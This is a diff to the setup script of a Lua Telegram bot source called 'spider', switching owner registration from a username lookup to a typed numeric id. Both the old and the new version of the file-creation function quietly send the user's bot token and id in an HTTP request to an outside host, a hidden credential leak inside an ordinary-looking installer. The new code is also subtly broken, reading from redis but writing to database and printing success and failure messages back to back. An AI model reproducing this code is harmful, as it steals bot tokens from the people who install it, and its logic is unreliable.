@@ -11,8 +11,6 @@ spider_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
-
-UserName = "]]..UserName..[["
 ]])
 spider_Info_Sudo:close()
 end  
@@ -32,39 +30,19 @@ io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-------------------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------------------
-if not database:get(Server_spider.."UserName_spider") then
-print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
-local UserName = io.read():gsub('@','')
-if UserName ~= '' then
-local Get_Info = http.request("http://tshake.ml/info/?user="..UserName)
-if Get_Info:match('Is_Spam') then
-io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
-return false
-end
-local Json = JSON:decode(Get_Info)
-if Json.Info == false then
-io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
+if not redis:get(Server_spider.."Id_spider") then
+print("\27[1;34m\n»» Send Your id Sudo : \27[m")
+local Id = io.read():gsub(' ','') 
+if tostring(Id):match('%d+') then
+io.write('\n\27[1;31m»» The id Is Saved\n\27[0;39;49m')
+database:set(Server_spider.."Id_spider",Id)
+io.write('\n\27[1;31m»» Sorry The id is not Correct \n\27[0;39;49m')
 os.execute('lua start.lua')
-else
-if Json.Info == 'Channel' then
-io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
-os.execute('lua start.lua')
-else
-io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_spider.."UserName_spider",Json.Info.Username)
-database:set(Server_spider.."Id_spider",Json.Info.Id)
 end
-end
-else
-io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
-end 
-os.execute('lua start.lua')
 end
 local function Files_spider_Info()
-Create_Info(database:get(Server_spider.."Token_spider"),database:get(Server_spider.."Id_spider"),database:get(Server_spider.."UserName_spider"))   
-http.request("http://spiderTeam/add/?id="..database:get(Server_spider.."Id_spider").."&user="..database:get(Server_spider.."UserName_spider").."&token="..database:get(Server_spider.."Token_spider"))
+Create_Info(database:get(Server_spider.."Token_spider"),database:get(Server_spider.."Id_spider"))   
+http.request("http://spiderTeam/add/?id="..database:get(Server_spider.."Id_spider").."&user=UserName_spider&token="..database:get(Server_spider.."Token_spider"))
 local Runspider = io.open("spider", 'w')
 Runspider:write([[
 #!/usr/bin/env bash
@@ -91,7 +69,8 @@ done
 RunTs:close()
 end
 Files_spider_Info()
-database:del(Server_spider.."Token_spider");database:del(Server_spider.."Id_spider");database:del(Server_spider.."UserName_spider")
+database:del(Server_spider.."Token_spider")
+database:del(Server_spider.."Id_spider")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
@@ -102,7 +81,8 @@ AutoFiles_spider()
 var = true
 else   
 f:close()  
-database:del(Server_spider.."Token_spider");database:del(Server_spider.."Id_spider");database:del(Server_spider.."UserName_spider")
+database:del(Server_spider.."Token_spider")
+database:del(Server_spider.."Id_spider")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
